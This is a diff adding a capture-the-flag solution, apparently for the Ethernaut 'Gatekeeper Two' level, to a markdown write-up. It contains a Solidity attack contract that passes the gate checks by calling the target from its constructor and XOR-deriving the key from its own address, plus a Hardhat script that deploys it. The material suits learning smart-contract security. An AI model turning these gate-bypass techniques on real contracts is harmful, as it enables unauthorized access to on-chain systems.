@@ -467,3 +467,42 @@ main().catch((error) => {
   process.exitCode = 1;
 });
 ```
+
+## 14 Gatekeeper Two
+
+```sol
+pragma solidity ^0.8.0;
+
+interface IGatekeeperTwo {
+  function enter(bytes8 _gateKey) external;
+}
+
+contract GatekeeperTwoAttack {
+  // Launching the attack from a constructor ensures extcodesize(caller()) == 0
+  constructor(address target) {
+    uint64 gateKey = uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ type(uint64).max;
+    require(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ uint64(gateKey) == type(uint64).max);
+    IGatekeeperTwo(target).enter(bytes8(gateKey));
+  }
+}
+```
+
+```js
+const hre = require("hardhat");
+
+async function main() {
+  const target = (await hre.ethers.getContractFactory("GatekeeperTwo")).attach("<target contract address>");
+  console.log(`Target entrant = ${await target.entrant()}`);
+
+  const contract = await hre.ethers.deployContract("GatekeeperTwoAttack", [await target.getAddress()]);
+  await contract.waitForDeployment();
+  console.log(`Contract address: ${await contract.getAddress()}`);
+
+  console.log(`Target entrant = ${await target.entrant()}`);
+}
+
+main().catch((error) => {
+  console.error(error);
+  process.exitCode = 1;
+});
+```
